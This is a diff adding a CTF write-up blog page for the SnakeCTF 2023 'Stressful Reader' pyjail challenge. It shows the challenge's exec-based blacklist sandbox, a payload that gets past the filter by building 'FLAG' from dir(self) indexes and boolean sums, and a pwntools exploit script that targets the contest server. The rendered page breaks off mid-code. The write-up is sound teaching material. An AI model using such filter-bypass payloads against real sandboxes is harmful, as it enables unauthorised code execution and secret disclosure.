@@ -1,0 +1,525 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>SnakeCTF23 - Stressful Reader | leo_something</title>
+<meta name="keywords" content="misc, python, pyjail">
+<meta name="description" content="Pyjail challenge from SnakeCTF 2023.">
+<meta name="author" content="team bhackari">
+<link rel="canonical" href="http://leo1.cc:5555/posts/writeups/snakectf23-stressful_reader/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.0c2131417d0b88f5928cdb2549da0d09bb391dae4fb3114012aa1349b07d4a44.css" integrity="sha256-DCExQX0LiPWSjNslSdoNCbs5Ha5PsxFAEqoTSbB9SkQ=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://leo1.cc:5555/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://leo1.cc:5555/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://leo1.cc:5555/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://leo1.cc:5555/apple-touch-icon.png">
+<link rel="mask-icon" href="http://leo1.cc:5555/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://leo1.cc:5555/posts/writeups/snakectf23-stressful_reader/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:url" content="http://leo1.cc:5555/posts/writeups/snakectf23-stressful_reader/">
+  <meta property="og:site_name" content="leo_something">
+  <meta property="og:title" content="SnakeCTF23 - Stressful Reader">
+  <meta property="og:description" content="Pyjail challenge from SnakeCTF 2023.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2023-12-12T12:00:00+00:00">
+    <meta property="article:modified_time" content="2023-12-12T12:00:00+00:00">
+    <meta property="article:tag" content="Misc">
+    <meta property="article:tag" content="Python">
+    <meta property="article:tag" content="Pyjail">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SnakeCTF23 - Stressful Reader">
+<meta name="twitter:description" content="Pyjail challenge from SnakeCTF 2023.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "http://leo1.cc:5555/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "SnakeCTF23 - Stressful Reader",
+      "item": "http://leo1.cc:5555/posts/writeups/snakectf23-stressful_reader/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "SnakeCTF23 - Stressful Reader",
+  "name": "SnakeCTF23 - Stressful Reader",
+  "description": "Pyjail challenge from SnakeCTF 2023.",
+  "keywords": [
+    "misc", "python", "pyjail"
+  ],
+  "articleBody": "Challenge description: I want to read an env variable, but I’m getting stressed out because of that\nblacklist!!! Would you help me plz? :(\nnc misc.snakectf.org 1700\nThe file attached to the challenge is called jail.py, so we deduce that this is a pyjail challenge, meaning that we have to find a way to exit a python sandbox and find the flag in the host file system.\nSource code: Jail.py implements a python class called “Jail”, this class implements 3 methods:\n__init__: this will initialize 4 attributes with empty strings (F, L, A and G,) and then call the run_code method with our input as a parameter. run_code: this is the function where all the magic happens: our input has to pass a blacklist-based filter to then be executed by an exec function, our goal is to create a payload that can pass the blacklist filter and print the flag using python code. Note that any attempt to use blacklisted strings or chars will result in an error message and the code not beeing executed. get_var: this functions takes a string as a parameter and prints the env variable with that name. #!/usr/bin/env python3 import os banner = r\"\"\" _____ _ __ _ _ / ___| | / _| | | | | \\ `--.| |_ _ __ ___ ___ ___| |_ _ _| | _ __ ___ __ _ __| | ___ _ __ `--. \\ __| '__/ _ \\/ __/ __| _| | | | | | '__/ _ \\/ _` |/ _` |/ _ \\ '__| /\\__/ / |_| | | __/\\__ \\__ \\ | | |_| | | | | | __/ (_| | (_| | __/ | \\____/ \\__|_| \\___||___/___/_| \\__,_|_| |_| \\___|\\__,_|\\__,_|\\___|_| \"\"\" class Jail(): def __init__(self) -\u003e None: print(banner) print() print() print(\"Will you be able to read the $FLAG?\") print(\"\u003e \",end=\"\") self.F = \"\" self.L = \"\" self.A = \"\" self.G = \"\" self.run_code(input()) pass def run_code(self, code): badchars = [ 'c', 'h', 'j', 'k', 'n', 'o', 'p', 'q', 'u', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '!', '\"', '#', '$', '%', '\u0026', '\\'', '-', '/', ';', '\u003c', '=', '\u003e', '?', '@', '[', '\\\\', ']', '^', '`', '{', '|', '}', '~', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'] badwords = [\"aiter\", \"any\", \"ascii\", \"bin\", \"bool\", \"breakpoint\", \"callable\", \"chr\", \"classmethod\", \"compile\", \"dict\", \"enumerate\", \"eval\", \"exec\", \"filter\", \"getattr\", \"globals\", \"input\", \"iter\", \"next\", \"locals\", \"memoryview\", \"next\", \"object\", \"open\", \"print\", \"setattr\", \"staticmethod\", \"vars\", \"__import__\", \"bytes\", \"keys\", \"str\", \"join\", \"__dict__\", \"__dir__\", \"__getstate__\", \"upper\"] if (code.isascii() and all([x not in code for x in badchars]) and all([x not in code for x in badwords])): exec(code) else: print(\"Exploiting detected, plz halp :/\") def get_var(self, varname): print(os.getenv(varname)) if (__name__ == \"__main__\"): Jail() Solution: Obviously the attributes F, L, A and G are not there only because they are nice, but there must be a way to use those variable names as chars, considering also that these are blacklisted characters.\nSo our final goal must be to call the get_var function passing “FLAG” as a parameter, using the attributes called F, L, A, G.\nThe first step we took was to create a python script to iterate throught the various printable chars and print only the ones allowed by the blacklist:\nimport string badchars = [ 'c', 'h', 'j', 'k', 'n', 'o', 'p', 'q', 'u', 'w', 'x', 'y', 'z' , 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N' , 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W' , 'X', 'Y', 'Z', '!', '\"', '#', '$', '%' , '\u0026', '\\'', '-', '/', ';', '\u003c', '=', '\u003e', '?', '@' , '[', '\\\\', ']', '^', '`', '{', '|', '}', '~' , '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'] allowed = [] for i in string.printable: if i not in badchars: allowed.append(i) print(allowed) and the result was:\n['a', 'b', 'd', 'e', 'f', 'g', 'i', 'l', 'm', 'r', 's', 't', 'v', '(', ')', '*', '+', ',', '.', ':', '_', ' ', '\\t', '\\n', '\\r', '\\x0b', '\\x0c'] We can see that with those chars we can compose different python keywords like self and get_var, which might be useful to print the flag. The only thing that we have to craft is the string “FLAG”, mainly because we are not allowed to use those letters (obviously) and we can’t use chars such as the backtick and the double qoutes.\n**How can we access the attributes inside __init__ and use their names as strings?\nThere is a python function called dir that lists all the methods, attributes and built-ins of an object. We can see that __dir__ is blacklisted, while dir is not , this is a good starting point.\n**Now, what object do we pass to this function?\nEasy, we pass self as a parameter, which is a keyword that is used to indicate the object itself inside the class.\nFrom now on, to debug the payload, we executed the pyjail locally with a small change inside it: we removed the string “print” from the blacklist (and the characters of which the string “print” is composed), this was obviously done for debugging purpuses. So now let’s try locally our payload:\nprint(dir(self)) the result was:\n['A', 'F', 'G', 'L', '__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', 'get_var', 'run_code'] That’s exactly what we wanted: it returns a list containing the names of every built-ins, methods and attributes of the object, including also the strings A, F, G and L.\nNow, thought, we have another problem:\n**how do we access these elements without using “bad characters”?\nLet’s take a deeper look throught the built-ins methods by running:\nprint(dir(dir(self)) the result was:\n['__add__', '__class__', '__class_getitem__', '__contains__', '__delattr__', '__delitem__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__gt__', '__hash__', '__iadd__', '__imul__', '__init__', '__init_subclass__', '__iter__', '__le__', '__len__', '__lt__', '__mul__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__reversed__', '__rmul__', '__setattr__', '__setitem__', '__sizeof__', '__str__', '__subclasshook__', 'append', 'clear', 'copy', 'count', 'extend', 'index', 'insert', 'pop', 'remove', 'reverse', 'sort'] The __getitem__ method might be interesting for us, because it takes an index as a parameter and returns the element that is at that index inside of a list.\nThat’s perfect, but now we have another problem: we are not able to use numeric characters inside of our payload, so how can we solve this problem?\nWe must first find a way to produce integer values as output, we may use a function that returns an integer and then use + or * to calculate the right index.\nBut we liked to think about it in an easier way: we know that conditional expressions return True or False, in short: 1 or 0, so we could sum the result of conditional expression in order to create the right index.\nBut, again, we have something that blocks us: \u003e, \u003c and = are blacklisted, but these operators are not the only available, we can still use the is keyword (it checks if 2 objects are the same object).\nTo create 1s and 0s we decided to use these expressions:\nself is self -\u003e True -\u003e 1 self is dir(self) -\u003e False -\u003e 0 **Now we have everything we need to write our payload and obtain the flag.\nWe can divide the payload in 4 parts, each part will return a character we need to compose the string “FLAG”:\n‘F’ is at index 1: dir(self).__getitem__(self is self) ‘L’ is at index 3: dir(self).__getitem__((self is self)+(self is self)+(self is self)) ‘A’ is at index 0: dir(self).__getitem__(self is dir(self)) ‘G’ is at index 2: dir(self).__getitem__((self is self)+(self is self)) Now we can concatenate these chars to create our final payload:\nself.get_var(dir(self).__getitem__(self is self) + dir(self).__getitem__((self is self) +\t(self is self) + (self is self)) + dir(self).__getitem__(self is dir(self)) + dir(self).__getitem__((self is self) + (self is self))) Final Exploit: from pwn import * r = remote(\"misc.snakectf.org\", 1700) F = \"dir(self).__getitem__(self is self)\" L = \"dir(self).__getitem__((self is self) + (self is self) + (self is self))\" A = \"dir(self).__getitem__(self is dir(self))\" G = \"dir(self).__getitem__((self is self) + (self is self))\" payload = f\"self.get_var({F}+{L}+{A}+{G})\".encode() r.sendlineafter(b\"\u003e \", payload) print(r.recvline().strip()) r.close() Flag: snakeCTF{7h3_574r_d1d_7h3_j0b} ",
+  "wordCount" : "1386",
+  "inLanguage": "en",
+  "datePublished": "2023-12-12T12:00:00Z",
+  "dateModified": "2023-12-12T12:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "team bhackari"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://leo1.cc:5555/posts/writeups/snakectf23-stressful_reader/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "leo_something",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://leo1.cc:5555/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://leo1.cc:5555/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://leo1.cc:5555/categories/" title="Categories">
+                    <span>Categories</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://leo1.cc:5555/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://leo1.cc:5555/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      SnakeCTF23 - Stressful Reader
+    </h1>
+    <div class="post-meta"><span title='2023-12-12 12:00:00 +0000 UTC'>December 12, 2023</span>&nbsp;·&nbsp;team bhackari
+
+</div>
+  </header>
+  <div class="tags" style="padding: 2px;">
+    <div style="display: flex; flex-wrap: wrap; gap: 5px;">
+      
+      <a href="/tags/misc" class="custom-tag">
+        misc
+      </a>
+      
+      <a href="/tags/python" class="custom-tag">
+        python
+      </a>
+      
+      <a href="/tags/pyjail" class="custom-tag">
+        pyjail
+      </a>
+      
+    </div>
+  </div>
+
+  <div style="height: var(--gap);"></div> 
+  <div class="post-content"><h2 id="challenge-description">Challenge description:<a hidden class="anchor" aria-hidden="true" href="#challenge-description">#</a></h2>
+<blockquote>
+<p>I want to read an env variable, but I&rsquo;m getting stressed out because of that<br>
+blacklist!!! Would you help me plz? :(</p>
+<p><code>nc misc.snakectf.org 1700</code></p>
+</blockquote>
+<p>The file attached to the challenge is called <code>jail.py</code>, so we deduce that this is a pyjail challenge, meaning that we have to find a way to exit a python sandbox and find the flag in the host file system.</p>
+<hr>
+<h2 id="source-code">Source code:<a hidden class="anchor" aria-hidden="true" href="#source-code">#</a></h2>
+<p><code>Jail.py</code> implements a python class called “Jail”, this class  implements 3 methods:</p>
+<ol>
+<li><code>__init__</code>: this will initialize 4 attributes with empty strings (<code>F</code>, <code>L</code>, <code>A</code> and <code>G</code>,) and then call the <code>run_code</code> method with our input as a parameter.</li>
+<li><code>run_code</code>: this is the function where all the magic happens: our input has to pass a blacklist-based filter to then be executed by an <code>exec</code> function, our goal is to create a payload that can pass the blacklist filter and print the flag using python code. Note that any attempt to use blacklisted strings or chars will result in an error message and the code not beeing executed.</li>
+<li><code>get_var</code>: this functions takes a string as a parameter and prints the env variable with that name.</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>banner <span style="color:#f92672">=</span> <span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> _____ _                      __       _                       _
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/  ___| |                    / _|     | |                     | |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">\ `--.| |_ _ __ ___  ___ ___| |_ _   _| |   _ __ ___  __ _  __| | ___ _ __
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> `--. \ __| &#39;__/ _ \/ __/ __|  _| | | | |  | &#39;__/ _ \/ _` |/ _` |/ _ \ &#39;__|
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/\__/ / |_| | |  __/\__ \__ \ | | |_| | |  | | |  __/ (_| | (_| |  __/ |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">\____/ \__|_|  \___||___/___/_|  \__,_|_|  |_|  \___|\__,_|\__,_|\___|_|
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Jail</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self) <span style="color:#f92672">-&gt;</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>        print(banner)
+</span></span><span style="display:flex;"><span>        print()
+</span></span><span style="display:flex;"><span>        print()
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Will you be able to read the $FLAG?&#34;</span>)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;&gt; &#34;</span>,end<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>F <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>L <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>A <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>G <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>run_code(input())
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">run_code</span>(self, code):
+</span></span><span style="display:flex;"><span>        badchars <span style="color:#f92672">=</span> [ <span style="color:#e6db74">&#39;c&#39;</span>, <span style="color:#e6db74">&#39;h&#39;</span>, <span style="color:#e6db74">&#39;j&#39;</span>, <span style="color:#e6db74">&#39;k&#39;</span>, <span style="color:#e6db74">&#39;n&#39;</span>, <span style="color:#e6db74">&#39;o&#39;</span>, <span style="color:#e6db74">&#39;p&#39;</span>, <span style="color:#e6db74">&#39;q&#39;</span>, <span style="color:#e6db74">&#39;u&#39;</span>, <span style="color:#e6db74">&#39;w&#39;</span>, <span style="color:#e6db74">&#39;x&#39;</span>, <span style="color:#e6db74">&#39;y&#39;</span>, <span style="color:#e6db74">&#39;z&#39;</span>, <span style="color:#e6db74">&#39;A&#39;</span>, <span style="color:#e6db74">&#39;B&#39;</span>, <span style="color:#e6db74">&#39;C&#39;</span>, <span style="color:#e6db74">&#39;D&#39;</span>, <span style="color:#e6db74">&#39;E&#39;</span>, <span style="color:#e6db74">&#39;F&#39;</span>, <span style="color:#e6db74">&#39;G&#39;</span>, <span style="color:#e6db74">&#39;H&#39;</span>, <span style="color:#e6db74">&#39;I&#39;</span>, <span style="color:#e6db74">&#39;J&#39;</span>, <span style="color:#e6db74">&#39;K&#39;</span>, <span style="color:#e6db74">&#39;L&#39;</span>, <span style="color:#e6db74">&#39;M&#39;</span>, <span style="color:#e6db74">&#39;N&#39;</span>, <span style="color:#e6db74">&#39;O&#39;</span>, <span style="color:#e6db74">&#39;P&#39;</span>, <span style="color:#e6db74">&#39;Q&#39;</span>, <span style="color:#e6db74">&#39;R&#39;</span>, <span style="color:#e6db74">&#39;S&#39;</span>, <span style="color:#e6db74">&#39;T&#39;</span>, <span style="color:#e6db74">&#39;U&#39;</span>, <span style="color:#e6db74">&#39;V&#39;</span>, <span style="color:#e6db74">&#39;W&#39;</span>, <span style="color:#e6db74">&#39;X&#39;</span>, <span style="color:#e6db74">&#39;Y&#39;</span>, <span style="color:#e6db74">&#39;Z&#39;</span>, <span style="color:#e6db74">&#39;!&#39;</span>, <span style="color:#e6db74">&#39;&#34;&#39;</span>, <span style="color:#e6db74">&#39;#&#39;</span>, <span style="color:#e6db74">&#39;$&#39;</span>, <span style="color:#e6db74">&#39;%&#39;</span>, <span style="color:#e6db74">&#39;&amp;&#39;</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;-&#39;</span>, <span style="color:#e6db74">&#39;/&#39;</span>, <span style="color:#e6db74">&#39;;&#39;</span>, <span style="color:#e6db74">&#39;&lt;&#39;</span>, <span style="color:#e6db74">&#39;=&#39;</span>, <span style="color:#e6db74">&#39;&gt;&#39;</span>, <span style="color:#e6db74">&#39;?&#39;</span>, <span style="color:#e6db74">&#39;@&#39;</span>, <span style="color:#e6db74">&#39;[&#39;</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;]&#39;</span>, <span style="color:#e6db74">&#39;^&#39;</span>, <span style="color:#e6db74">&#39;`&#39;</span>, <span style="color:#e6db74">&#39;{&#39;</span>, <span style="color:#e6db74">&#39;|&#39;</span>, <span style="color:#e6db74">&#39;}&#39;</span>, <span style="color:#e6db74">&#39;~&#39;</span>, <span style="color:#e6db74">&#39;0&#39;</span>, <span style="color:#e6db74">&#39;1&#39;</span>, <span style="color:#e6db74">&#39;2&#39;</span>, <span style="color:#e6db74">&#39;3&#39;</span>, <span style="color:#e6db74">&#39;4&#39;</span>, <span style="color:#e6db74">&#39;5&#39;</span>, <span style="color:#e6db74">&#39;6&#39;</span>, <span style="color:#e6db74">&#39;7&#39;</span>, <span style="color:#e6db74">&#39;8&#39;</span>, <span style="color:#e6db74">&#39;9&#39;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        badwords <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;aiter&#34;</span>, <span style="color:#e6db74">&#34;any&#34;</span>, <span style="color:#e6db74">&#34;ascii&#34;</span>, <span style="color:#e6db74">&#34;bin&#34;</span>, <span style="color:#e6db74">&#34;bool&#34;</span>, <span style="color:#e6db74">&#34;breakpoint&#34;</span>, <span style="color:#e6db74">&#34;callable&#34;</span>, <span style="color:#e6db74">&#34;chr&#34;</span>, <span style="color:#e6db74">&#34;classmethod&#34;</span>, <span style="color:#e6db74">&#34;compile&#34;</span>, <span style="color:#e6db74">&#34;dict&#34;</span>, <span style="color:#e6db74">&#34;enumerate&#34;</span>, <span style="color:#e6db74">&#34;eval&#34;</span>, <span style="color:#e6db74">&#34;exec&#34;</span>, <span style="color:#e6db74">&#34;filter&#34;</span>, <span style="color:#e6db74">&#34;getattr&#34;</span>, <span style="color:#e6db74">&#34;globals&#34;</span>, <span style="color:#e6db74">&#34;input&#34;</span>, <span style="color:#e6db74">&#34;iter&#34;</span>, <span style="color:#e6db74">&#34;next&#34;</span>, <span style="color:#e6db74">&#34;locals&#34;</span>, <span style="color:#e6db74">&#34;memoryview&#34;</span>, <span style="color:#e6db74">&#34;next&#34;</span>, <span style="color:#e6db74">&#34;object&#34;</span>, <span style="color:#e6db74">&#34;open&#34;</span>, <span style="color:#e6db74">&#34;print&#34;</span>, <span style="color:#e6db74">&#34;setattr&#34;</span>, <span style="color:#e6db74">&#34;staticmethod&#34;</span>, <span style="color:#e6db74">&#34;vars&#34;</span>, <span style="color:#e6db74">&#34;__import__&#34;</span>, <span style="color:#e6db74">&#34;bytes&#34;</span>, <span style="color:#e6db74">&#34;keys&#34;</span>, <span style="color:#e6db74">&#34;str&#34;</span>, <span style="color:#e6db74">&#34;join&#34;</span>, <span style="color:#e6db74">&#34;__dict__&#34;</span>, <span style="color:#e6db74">&#34;__dir__&#34;</span>, <span style="color:#e6db74">&#34;__getstate__&#34;</span>, <span style="color:#e6db74">&#34;upper&#34;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (code<span style="color:#f92672">.</span>isascii() <span style="color:#f92672">and</span> 
+</span></span><span style="display:flex;"><span>            all([x <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> code <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> badchars]) <span style="color:#f92672">and</span> 
+</span></span><span style="display:flex;"><span>            all([x <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> code <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> badwords])):
+</span></span><span style="display:flex;"><span>            exec(code)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;Exploiting detected, plz halp :/&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_var</span>(self, varname):
+</span></span><span style="display:flex;"><span>        print(os<span style="color:#f92672">.</span>getenv(varname))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (__name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>):
+</span></span><span style="display:flex;"><span>    Jail()
+</span></span></code></pre></div><hr>
+<h2 id="solution">Solution:<a hidden class="anchor" aria-hidden="true" href="#solution">#</a></h2>
+<p>Obviously the attributes <code>F</code>, <code>L</code>, <code>A</code> and <code>G</code> are not there only because they are nice, but there must be a way to use those variable names as chars, considering also that these are blacklisted characters.</p>
+<blockquote>
+<p>So our final goal must be to call the <code>get_var</code> function passing &ldquo;FLAG&rdquo; as a parameter, using the attributes called <code>F</code>, <code>L</code>, <code>A</code>, <code>G</code>.</p>
+</blockquote>
+<p>The first step we took was to create a python script to iterate throught the various printable chars and print only the ones allowed by the blacklist:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> string
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>badchars <span style="color:#f92672">=</span> [ <span style="color:#e6db74">&#39;c&#39;</span>, <span style="color:#e6db74">&#39;h&#39;</span>, <span style="color:#e6db74">&#39;j&#39;</span>, <span style="color:#e6db74">&#39;k&#39;</span>, <span style="color:#e6db74">&#39;n&#39;</span>, <span style="color:#e6db74">&#39;o&#39;</span>, <span style="color:#e6db74">&#39;p&#39;</span>, <span style="color:#e6db74">&#39;q&#39;</span>, <span style="color:#e6db74">&#39;u&#39;</span>, <span style="color:#e6db74">&#39;w&#39;</span>, <span style="color:#e6db74">&#39;x&#39;</span>, <span style="color:#e6db74">&#39;y&#39;</span>, <span style="color:#e6db74">&#39;z&#39;</span>
+</span></span><span style="display:flex;"><span>            , <span style="color:#e6db74">&#39;A&#39;</span>, <span style="color:#e6db74">&#39;B&#39;</span>, <span style="color:#e6db74">&#39;C&#39;</span>, <span style="color:#e6db74">&#39;D&#39;</span>, <span style="color:#e6db74">&#39;E&#39;</span>, <span style="color:#e6db74">&#39;F&#39;</span>, <span style="color:#e6db74">&#39;G&#39;</span>, <span style="color:#e6db74">&#39;H&#39;</span>, <span style="color:#e6db74">&#39;I&#39;</span>, <span style="color:#e6db74">&#39;J&#39;</span>, <span style="color:#e6db74">&#39;K&#39;</span>, <span style="color:#e6db74">&#39;L&#39;</span>, <span style="color:#e6db74">&#39;M&#39;</span>, <span style="color:#e6db74">&#39;N&#39;</span>
+</span></span><span style="display:flex;"><span>            , <span style="color:#e6db74">&#39;O&#39;</span>, <span style="color:#e6db74">&#39;P&#39;</span>, <span style="color:#e6db74">&#39;Q&#39;</span>, <span style="color:#e6db74">&#39;R&#39;</span>, <span style="color:#e6db74">&#39;S&#39;</span>, <span style="color:#e6db74">&#39;T&#39;</span>, <span style="color:#e6db74">&#39;U&#39;</span>, <span style="color:#e6db74">&#39;V&#39;</span>, <span style="color:#e6db74">&#39;W&#39;</span>
